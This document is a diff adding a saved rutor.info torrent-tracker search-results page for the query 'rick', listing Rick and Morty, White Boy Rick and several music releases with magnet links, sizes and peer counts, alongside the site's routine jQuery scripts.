@@ -1,0 +1,431 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Поиск</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Поиск</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_bn_2357" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">
+	var search_page = 0;
+	var search_string = 'rick';
+	var search_category = 0;
+	var search_sort = 0;
+	var search_in = 0;
+	var search_method = 0;
+	var sort_ascdesc = 0;
+
+	if (search_sort % 2 != 0)
+	{
+		search_sort -= 1;
+		sort_ascdesc = 1;
+	}
+
+
+	$(document).ready(function()
+	{
+		$('#category_id').attr("value", search_category);
+		$('#sort_id').attr("value", search_sort);
+		//$('#inputtext_id').val(search_string);
+		$('#search_in').attr("value", search_in);
+		$('#search_method').attr("value", search_method);
+		if (sort_ascdesc == 0)
+			$('input[name=s_ad]')[1].checked = true;
+		else
+			$('input[name=s_ad]')[0].checked = true;
+	});
+
+	function search_submit()
+	{
+		var sort_id = parseInt($('#sort_id').val())+parseInt($('input[name=s_ad]:checked').val());
+		document.location.href = '/search/' + search_page + '/' + $('#category_id').val() + '/' + $('#search_method').val()+''+$('#search_in').val()+'0' + '/' + sort_id + '/' + $('#inputtext_id').val().replace(/&/g,'AND');
+	}
+	</script><fieldset><legend>Поиск и сортировка</legend>
+	<form onsubmit="search_submit(); return false;">
+	<table>
+	<tr>
+	<td>Ищем</td>
+	<td>
+		<input type="text" size="35" id="inputtext_id" value="rick" />
+		<select name="search_method" id="search_method">
+			<option value="0">фразу полностью</option>
+			<option value="1">все слова</option>
+			<option value="2">любое из слов</option>
+			<option value="3">логическое выражение</option>
+		</select>
+		в
+		<select name="search_in" id="search_in">
+			<option value="0">названии</option>
+			<option value="1">названии и описании</option>
+		</select>
+	</td>
+	</tr>
+	<tr>
+	<td>Категория</td>
+	<td>
+	<select name="category" id="category_id">
+		<option value="0">Любая категория</option><option value="1">Зарубежные фильмы</option><option value="5">Наши фильмы</option><option value="12">Научно-популярные фильмы</option><option value="4">Зарубежные сериалы</option><option value="16">Наши сериалы</option><option value="6">Телевизор</option><option value="7">Мультипликация</option><option value="10">Аниме</option><option value="2">Музыка</option><option value="8">Игры</option><option value="9">Софт</option><option value="13">Спорт и Здоровье</option><option value="15">Юмор</option><option value="14">Хозяйство и Быт</option><option value="11">Книги</option><option value="3">Другое</option><option value="17">Иностранные релизы</option></select>
+	</td>
+	</tr>
+	<tr>
+	<td>Упорядочить по</td>
+	<td>
+	<select id="sort_id">
+		<option value="0">дате добавления</option>
+		<option value="2">раздающим</option>
+		<option value="4">качающим</option>
+		<option value="6">названию</option>
+		<option value="8">размеру</option>
+		<option value="10">релевантности</option>
+	</select>
+	по
+	<label><input type="radio" name="s_ad" value="1"  />возрастанию</label>
+	<label><input type="radio" name="s_ad" value="0"  checked="checked"  />убыванию</label>
+	</td>
+	</tr>
+
+	<tr>
+	<td>
+	<input type="submit" value="Поехали" onclick="search_submit(); return false;" />
+	</td>
+	</tr>
+
+
+	</table>
+	</form>
+	</fieldset><div id="index"><b>Страницы:  1</b> Результатов поиска 85 (max. 2000)<table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>16&nbsp;Авг&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/770850"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:04f599484ebd29a6fd71e7654d797be777a4b1ba&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/770850/rik-i-morti_rick-and-morty-s04-2019-webrip-hevc-2160p-syenduk">Рик и Морти / Rick and Morty [S04] (2019) WEBRip-HEVC 2160p | Сыендук </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.65&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;27</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>16&nbsp;Авг&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/770848"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3f4e91bd4e7100dabc81a251c9f750fa0436c5c3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/770848/rik-i-morti_rick-and-morty-s03-2017-webrip-hevc-2160p-syenduk">Рик и Морти / Rick and Morty [S03] (2017) WEBRip-HEVC 2160p | Сыендук </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;8</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>16&nbsp;Авг&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/770796"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:443b9fff5f802d3f78a8e6c8ebc61710fb24664e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/770796/rik-i-morti_rick-and-morty-s02-2015-webrip-hevc-2160p-syenduk">Рик и Морти / Rick and Morty [S02] (2015) WEBRip-HEVC 2160p | Сыендук </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.38&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>16&nbsp;Авг&nbsp;20</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/770794"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:eb257a3074bd0eb72cf92ee02e9ff45b69823d03&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/770794/rik-i-morti_rick-and-morty-s01-2013-2014-webrip-hevc-2160p-syenduk">Рик и Морти / Rick and Morty [S01] (2013-2014) WEBRip-HEVC 2160p | Сыендук </a></td>
+<td align="right">7.93&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;21</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>05&nbsp;Июн&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/439034"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f1dd1959e8b580c1a7f7b9be80eb05b83bb9e82a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/439034/rik-i-morti_rick-and-morty-s01-04-2013-2020-bdrip-web-dlrip-syenduk">Рик и Морти / Rick and Morty [S01-04] (2013-2020) BDRip, WEB-DLRip | Сыендук </a></td> <td align="right">48<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">14.48&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;143</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;94</span></td></tr><tr class="tum"><td>02&nbsp;Июн&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/728381"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:654e47fa2aeefb0a8e593be9f8e2c77a74150ec0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/728381/rik-i-morti_rick-and-morty-s04-2019-web-dl-1080p-syenduk">Рик и Морти / Rick and Morty [S04] (2019) WEB-DL 1080p | Сыендук </a></td> <td align="right">50<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">6.17&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;165</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;91</span></td></tr><tr class="gai"><td>02&nbsp;Июн&nbsp;20</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/760796"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1e4705c914423c4573fedb3ae8238061a095b4dd&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/760796/rik-i-morti_rick-and-morty-s04-2019-webrip-1080p-ideafilm">Рик и Морти / Rick and Morty [S04] (2019) WEBRip 1080p | IdeaFilm </a></td>
+<td align="right">10.89&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;16</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;12</span></td></tr><tr class="tum"><td>02&nbsp;Июн&nbsp;20</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/760795"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b631e3a6a3bb6d12a97d861f27160f049e3f9ec1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/760795/rik-i-morti_rick-and-morty-s04-2019-webrip-720p-ideafilm">Рик и Морти / Rick and Morty [S04] (2019) WEBRip 720p | IdeaFilm </a></td>
+<td align="right">5.50&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;20</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>02&nbsp;Июн&nbsp;20</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/760794"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e303268d06028c2b8f4a7e3500f677ae790c1dc5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/760794/rik-i-morti_rick-and-morty-s04-2019-webrip-ideafilm">Рик и Морти / Rick and Morty [S04] (2019) WEBRip | IdeaFilm </a></td>
+<td align="right">3.40&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;66</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;23</span></td></tr><tr class="tum"><td>01&nbsp;Июн&nbsp;20</td><td ><a class="downgif" href="http://d.rutor.info/download/729777"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:528f28a60445b8f93b70752e90037de37193cb83&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/729777/rik-i-morti_rick-and-morty-s04-2019-webrip-720p-syenduk">Рик и Морти / Rick and Morty [S04] (2019) WEBRip 720p | Сыендук </a></td> <td align="right">13<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.83&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;149</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;68</span></td></tr><tr class="gai"><td>01&nbsp;Июн&nbsp;20</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/734986"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d2c21f4e6461b0cf0725aad673286665983ed3e4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/734986/rik-i-morti_rick-and-morty-s04-2019-webrip-ot-kerob-l">Рик и Морти / Rick and Morty [S04] (2019) WEBRip от Kerob | L </a></td>
+<td align="right">3.85&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>01&nbsp;Дек&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/732140"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7417eebd9b18052efe2baf2761c17da42e3f09a8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/732140/rick-wakeman-christmas-portraits-2019-flac-24bit">Rick Wakeman - Christmas Portraits (2019) FLAC | 24bit </a></td>
+<td align="right">419.29&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>23&nbsp;Ноя&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/730585"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1a45ae76ba4de4731efa97c04b229f15410ca5ae&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/730585/rick-ross-port-of-miami-2-2019-mp3">Rick Ross - Port of Miami 2 (2019) MP3 </a></td>
+<td align="right">153.36&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>02&nbsp;Ноя&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/726426"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cd5b329b66bfd78fa5755d95377f48e866362769&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/726426/rick-santers-revitalize-1996-mp3">Rick Santers - Revitalize (1996) MP3 </a></td>
+<td align="right">81.29&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>26&nbsp;Окт&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/724976"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:faf9698498bdae97ba971f6a9fd1f035d8c7d08b&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/724976/rick-astley-the-best-of-me-2019-flac">Rick Astley - The Best Of Me (2019) FLAC </a></td>
+<td align="right">721.63&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>26&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/695752"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cd73d27a358af3b4c50f2918de8d7542c2bb36b5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/695752/rick-springfield-orchestrating-my-life-2019-mp3">Rick Springfield - Orchestrating My Life (2019) MP3 </a></td>
+<td align="right">111.79&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>21&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/686847"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2bebc070134a655b2857faa54308264d968ddfc8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686847/belyj-paren-rik_white-boy-rick-2018-bdrip-ot-megapeer-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip от MegaPeer | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">746.24&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>21&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/691586"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ca2aa15347cfb071808fdd14e62217e200cc60d1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691586/belyj-paren-rik_white-boy-rick-2018-bdrip-ot-megapeer-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip от MegaPeer | Лицензия </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>10&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/692899"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:41c473507278d28f565e95b24f1b05d2717b6102&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/692899/belyj-paren-rik_white-boy-rick-2018-webrip-2160p-4k-hdr-d-p-licenzija">Белый парень Рик / White Boy Rick (2018) WEBRip 2160p | 4K | HDR | D, P | Лицензия </a></td>
+<td align="right">11.84&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>10&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/686736"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b241be1e289622334beb51253cbec87914874e2b&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686736/belyj-paren-rik_white-boy-rick-2018-bdrip-avc-ot-ollandgroup-d-p-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip-AVC от OlLanDGroup | D, P | Лицензия </a></td> <td align="right">9<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.24&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;14</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>05&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/691887"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c3d2f1dfba951a4772f39eb782fd2b61c38703aa&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691887/belyj-paren-rik_white-boy-rick-2018-bdremux-1080p-ot-selezen-d-p-licenzija">Белый парень Рик / White Boy Rick (2018) BDRemux 1080p от селезень | D, P | Лицензия </a></td>
+<td align="right">21.99&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>05&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/691578"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8f001807ab86fc70c411c3083bcce62330e3ef18&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691578/belyj-paren-rik_white-boy-rick-2018-bdrip-1080p-ot-selezen-d-p-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip 1080p от селезень | D, P | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">13.41&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>05&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/691580"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2aa875f0274c95a5b88d270d5d5878260c19d2c6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691580/belyj-paren-rik_white-boy-rick-2018-bdrip-720p-ot-selezen-d-p-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip 720p от селезень | D, P | Лицензия </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">6.52&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;18</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>04&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/687544"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:130809c4af930316fd8962d80fc2245146115231&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/687544/belyj-paren-rik_white-boy-rick-2018-hdrip-ot-scarabey-licenzija">Белый парень Рик / White Boy Rick (2018) HDRip от Scarabey | Лицензия </a></td>
+<td align="right">1.40&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>04&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/691810"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d7e211e6df983f9932f4f7fa7b62dff992c5014d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691810/belyj-paren-rik_white-boy-rick-2018-bdrip-hevc-1080p-ot-hevc-club-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip-HEVC 1080p от HEVC-CLUB | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.68&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>04&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/689246"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4c968c88dbaedc7d9975bde087eb4acd3402e61a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/689246/belyj-paren-rik_white-boy-rick-2018-bdrip-ot-exkinoray-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip от ExKinoRay | Лицензия </a></td>
